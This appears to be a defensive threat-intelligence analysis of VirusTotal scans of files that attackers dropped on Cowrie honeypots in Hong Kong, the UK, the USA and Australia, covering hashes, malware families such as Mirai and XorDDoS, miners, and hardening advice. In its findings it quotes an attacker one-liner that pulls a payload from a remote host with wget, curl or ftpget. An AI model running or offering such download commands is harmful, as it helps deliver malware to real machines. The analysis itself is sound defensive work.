### Analysis of VirusTotal Findings for Common Cowrie Honeypot Download Files Across HK, UK, USA, and AUS Regions

The VirusTotal analysis provides insights into the nature of files downloaded to Cowrie honeypots in the HK, UK, USA, and AUS regions. 
Below is the highlight of the key findings from the VirusTotal Scan report, focusing on the file types, content, maliciousness, and threat labels. 

You can view the VirusTotal Analysis of the download files [here](VirusTotal_Analysis_on_common.md)

---

### Summary of VirusTotal Findings

The document lists 22 files common across all four regions, analyzed by VirusTotal. These files fall into two broad categories: **non-malicious ASCII text files** and **malicious executable or script files**. Below is a breakdown of the findings:

1. **Non-Malicious ASCII Text Files (8 files)**:
   - **Hashes**:
     - 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
     - 9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c
     - f704a4099553d77cd8a9fa8d181887cb6edbc8f7e86440743f975b5594cca97a
     - 70ae01ad0654dd2111832a08525a0fdba6994cd26c1278d79a91d54c9cb113be
     - 446c26d35cac3ecb54c860fd7c1ed3c51f1ca609b99c772f61a3615a1e31868b
     - d9fde4e5cc24e7a961520adfe1484237007292f9e53676dfa1c84e4acfc06742
     - c52248ffde4cb1f7a9f0c37120fb7ab237e9d66467341c2158c671b67fedebf7
     - 3f23f40ef5ce2ba16b0f07441e6e4821db9f23f1f864afd39ed229e518bfecaa
   - **File Type**: ASCII text, often with no line terminators.
   - **Content**:
     - One file contains "senpai" (199d11d0...).
     - One file contains command output: "^C 0+0 records in, 0+0 records out, 0 bytes transferred..." (9a45029b...), likely from an interrupted command like `dd`.
     - Six files share identical content: `S=ip address; (wget http://$S/p -O-||curl http://$S/p||ftpget $S - p||busybox wget http://$S/p -O-||busybox curl http://$S/p||busybox ftpget $S - p)`, a script attempting to download a payload using `wget`, `curl`, or `ftpget` from an IP address, leveraging `busybox` for compatibility.
   - **Maliciousness**: None flagged as malicious by VirusTotal (0/50 to 0/62 vendors).
   - **Threat Labels**: No threat categories or names assigned, suggesting these are benign or non-executable components of attacks.

2. **Malicious Files (14 files)**:
   - **Hashes**:
     - a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2
     - d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
     - ac017ec31921e5ce9118aac5b71d61d02a67378f6786000baec0c2caadc4a3a3
     - 3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae
     - b6c279ec4098398ff5746f16c525129db442d5dbdda44c401c9027fe5b752dca
     - 578553b85a60b77c1c112fae1e83c3a51b5e8e4c71d40ea3ec2dabef52b55e5a
     - 481b05b2e9acddae622a7e820248ec1ff35d01fa539af63cff893e6373f70e36
     - 526e81f6e88a137546d29b44f06f10ce1caea4d775e7698f70e48ba009f53079
     - ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
     - 2ef6bb55a79d81fbda6d574456a8c187f610c5ae2ddca38e32cf7cc50912b0bf
     - fc8730fbe87bcbdc093a1ffbcb0028ccb4c24638e55d13fd853b07574f4cbe4a
     - 7780e72f7dea978946d4615c8db1b239d3e2c742cfc8be2934006b1fd6071110
     - b6ee8e08f1d4992ca85770e6883c1d2206ebbaf42f99d99aba0e26278de8bffb
     - 94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
   - **File Types**:
     - **Bourne-Again shell scripts** (3 files): ASCII text executable, likely for Linux/Unix systems.
     - **ELF executables** (9 files): Various architectures (MIPS, ARM, x86-64, Intel 80386), mostly statically linked, targeting IoT or Linux systems.
     - **OpenSSH RSA public key** (1 file): Likely used for unauthorized access.
     - **ASCII text with CRLF** (1 file): Potentially a script or configuration file.
   - **Maliciousness**: Flagged by 20–46 out of 60–65 security vendors, indicating high confidence in malicious intent.
   - **Popular Threat Categories**:
     - **Trojan**: Dominant category (10–23 vendors per file), suggesting malware designed to gain unauthorized access or control.
     - **Downloader**: Common (7–21 vendors), indicating files that fetch additional malicious payloads.
     - **Miner**: Notable in several files (5–16 vendors), pointing to cryptocurrency mining malware.
     - **PUA (Potentially Unwanted Application)** and **Hacktool**: Less common but present in some files.
   - **Popular Threat Names**:
     - **multiverze**: Appears in multiple files (e.g., d46555af..., 3b157785..., b6c279ec..., 94f2e4d8...), likely a multi-platform malware or botnet.
     - **mirai/miraidownloader**: Found in two ELF files (578553b8..., 481b05b2...), indicating IoT botnet activity.
     - **medusa/geninst**: In shell scripts (ac017ec3..., 526e81f6...), suggesting a downloader or trojan.
     - **xorddos/ddos**: In an ELF file (ea40ecec...), pointing to DDoS capabilities.
     - **shell**, **malkey**, **vsnw01j24**, **gikam**, **pvcyv**, **r002c0dcq25**, **cnzib**: Indicate varied malware strains, often tied to trojans or miners.
   - **Suggested Threat Labels**:
     - Examples include trojan.shell/malkey, trojan.multiverze/vsnw01j24, downloader.medusa/geninst, trojan.mirai/miraidownloader, trojan.xorddos/ddos, miner.gikam/r002c0dcq25, and miner.cnzib/r002c0dcl25, reflecting diverse malicious functionalities.

---

### Highlights of Findings

1. **Dual Nature of Files**:
   - **Non-Malicious ASCII Files**: Eight files are not flagged as malicious, but six contain a download script (`S=ip address; ...`). While not inherently malicious, this script is designed to fetch payloads using `wget`, `curl`, or `ftpget`, often a precursor to malware delivery. The consistency across multiple hashes suggests a widespread campaign attempting to download malicious content.
   - **Malicious Files**: Fourteen files are flagged as malicious, primarily trojans, downloaders, and miners, targeting Linux and IoT devices. These files are executable or scripts, indicating active attack vectors.

2. **Prevalence of Trojans and Downloaders**:
   - The majority of malicious files are categorized as trojans (10–23 vendors) or downloaders (7–21 vendors), aligning with the TPOT data’s focus on brute-force attacks (e.g., targeting "root", "admin", port 22) to gain access and deploy payloads.
   - The download script in non-malicious files mirrors the downloader category, suggesting these files are part of the same attack chain, fetching trojans like "multiverze" or "mirai".

3. **IoT and Linux Targeting**:
   - Nine ELF executables target MIPS, ARM, x86-64, and Intel 80386 architectures, common in IoT devices and Linux systems. This aligns with the TPOT data’s heavy targeting of Linux 2.2.x-3.x (HK: 3,317,952; UK: 2,971,687; USA: 3,989,951; AUS: 2,819,156).
   - The presence of "mirai/miraidownloader" (578553b8..., 481b05b2...) confirms IoT botnet activity, consistent with attacks on ports like 23 (Telnet) and 5060 (SIP).

4. **Cryptocurrency Mining**:
   - Miners are identified in several files (e.g., 2ef6bb55..., fc8730fb..., 7780e72f..., b6ee8e08...), with labels like "miner.gikam" and "miner.pvcyv". This suggests attackers are leveraging compromised systems for cryptocurrency mining, a common goal in IoT and Linux attacks.

5. **Specific Malware Strains**:
   - **multiverze**: Appears in multiple files, indicating a versatile, multi-platform malware likely used in botnets or data theft.
   - **mirai**: Known for IoT botnets, its presence underscores the risk to devices with weak credentials (e.g., "123456", "admin").
   - **xorddos**: Associated with DDoS attacks, highlighting the potential for large-scale disruptions.
   - **medusa**: A downloader, likely fetching additional malicious payloads.

6. **SSH Key Exploitation**:
   - The OpenSSH RSA public key (a8460f44...) flagged as a trojan (29/61 vendors) suggests attempts to establish persistent access via SSH, correlating with the TPOT data’s high targeting of port 22 (SSH) across all regions.

7. **No False Negatives in Non-Malicious Files**:
   - The lack of malicious flags for ASCII text files does not guarantee safety. The download script’s presence indicates these files are part of an attack chain, likely fetching malicious payloads not captured in the VirusTotal scan.

---

### Integration with TPOT Honeypot Data

The VirusTotal findings complement the TPOT data, reinforcing the observed attack patterns:
- **Credential Attacks**: The TPOT data’s focus on weak credentials ("root", "admin", "123456") aligns with the SSH key (a8460f44...) and trojan/downloader files, which exploit compromised credentials to gain access.
- **Port Targeting**: The heavy targeting of port 22 (SSH) and 23 (Telnet) in TPOT data correlates with the SSH key and "mirai" malware, which are designed for IoT and Linux systems with weak Telnet/SSH configurations.
- **Botnet Activity**: The "345gs5662d34" username and password in TPOT data likely tie to the "multiverze" and "mirai" malware, indicating a coordinated botnet campaign across regions.
- **Vulnerability Exploitation**: While TPOT CVEs (e.g., CVE-2006-2369 for VNC, CVE-2002-0013 for SNMP) focus on protocol vulnerabilities, the VirusTotal files suggest post-exploitation payloads (trojans, miners) deployed after gaining access via these vulnerabilities.
- **Linux/IoT Focus**: The dominance of Linux 2.2.x-3.x in TPOT data aligns with the ELF executables and shell scripts targeting Linux and IoT architectures.

---

### Conclusions and Recommendations

1. **Widespread Botnet Activity**:
   - The presence of "multiverze" and "mirai" across regions indicates active botnet campaigns targeting IoT and Linux systems. The download script in non-malicious files suggests an initial infection vector fetching these payloads.

2. **Security Implications**:
   - **Weak Credentials**: The alignment of weak credentials in TPOT data with trojans and SSH keys underscores the need for strong password policies and disabling default accounts.
   - **IoT Vulnerabilities**: Mirai and similar malware highlight the risk to IoT devices, particularly those using Telnet (port 23) or SSH (port 22).
   - **Mining Threats**: Cryptocurrency miners indicate attackers are monetizing compromised systems, requiring monitoring for unusual CPU usage.

3. **Recommendations**:
   - **Network Security**: Block or monitor traffic on ports 22, 23, and 5060, and implement intrusion detection for download attempts (e.g., `wget`, `curl`).
   - **System Hardening**: Update IoT and Linux systems to patch vulnerabilities exploited by "mirai" and "xorddos". Disable Telnet and secure SSH configurations.
   - **Malware Detection**: Use antivirus solutions to detect trojans, downloaders, and miners like "multiverze" and "medusa". Monitor for unauthorized SSH keys.
   - **Threat Intelligence**: Track IPs associated with download scripts and known botnet infrastructure (e.g., those linked to "345gs5662d34" campaigns).

4. **Regional Consistency**: The commonality of these files across all four regions suggests a global attack campaign, likely automated and leveraging botnets. Organizations in all regions should prioritize defenses against these threats.

---


| **Category**               | **Findings**                                                                 |
|----------------------------|-----------------------------------------------------------------------------|
| **Non-Malicious Files (8)** | ASCII text; 6 files with download script (`wget`, `curl`, `ftpget`); 0/50–62 vendors flag malicious; likely initial attack vector. |
| **Malicious Files (14)**   | Shell scripts, ELF executables (MIPS, ARM, x86), SSH key; 20–46/60–65 vendors flag malicious; trojans, downloaders, miners dominate. |
| **Threat Categories**      | Trojans (10–23 vendors), downloaders (7–21), miners (5–16), PUA, hacktools; target IoT/Linux systems. |
| **Threat Names**           | multiverze, mirai/miraidownloader, medusa/geninst, xorddos/ddos, gikam, pvcyv, r002c0dcq25; indicate botnets, DDoS, mining. |
| **Integration with TPOT**  | Aligns with weak credentials ("root", "123456"), port 22/23 targeting, Linux focus; suggests botnet campaign (e.g., "345gs5662d34"). |
| **Key Insight**            | Botnets (mirai, multiverze) and miners exploit weak credentials and IoT/Linux systems; download scripts are precursors to malicious payloads. |
| **Recommendations**        | Secure SSH/Telnet, patch IoT/Linux, monitor ports 22/23/5060, detect trojans/miners, track botnet IPs. |
